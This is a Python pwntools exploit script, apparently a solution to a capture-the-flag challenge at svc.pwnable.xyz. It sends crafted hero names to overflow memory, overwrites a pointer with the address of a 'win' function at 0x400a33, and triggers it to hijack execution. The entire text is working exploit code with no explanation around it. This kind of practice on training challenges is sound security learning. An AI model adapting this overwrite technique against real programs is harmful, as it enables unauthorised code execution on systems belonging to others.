from pwn import *

debug = 0

def create_hero(size, name):
    sh.sendlineafter('> ', '1')
    sh.recvline()
    sh.sendline(str(size))
    sh.sendafter(': ', name)
    sh.sendlineafter('> ', '5')


def use_power():
    sh.sendlineafter('> ', '2')

if not debug:
    sh = remote('svc.pwnable.xyz',  30032)
else:
    sh  = process('./challenge')
win_addr = 0x400a33
create_hero(100, "A"*0x64)
create_hero(15, "B"*0x7 + p64(win_addr))
use_power()
sh.interactive()
